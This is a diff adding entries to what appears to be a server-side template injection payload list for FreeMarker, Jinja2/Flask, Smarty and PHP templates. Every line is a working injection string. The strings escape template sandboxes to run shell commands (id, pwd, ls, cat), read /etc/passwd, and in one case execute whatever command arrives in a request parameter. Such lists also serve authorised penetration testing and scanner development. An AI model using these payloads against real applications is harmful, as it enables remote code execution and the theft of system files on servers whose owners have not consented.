@@ -27,7 +27,16 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
 {{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls+/').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat+/*.txt').read()}}
+{{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("pwd").read()}}
+{{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("id").read()}}
+{{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("ls").read()}}
+{{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("ls+/").read()}}
+{{config.__class__.from_envvar.__globals__.__builtins__. __import__("os").popen("cat+/*.txt").read()}}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
 {$smarty.version}
 {php}echo `id`;{/php}
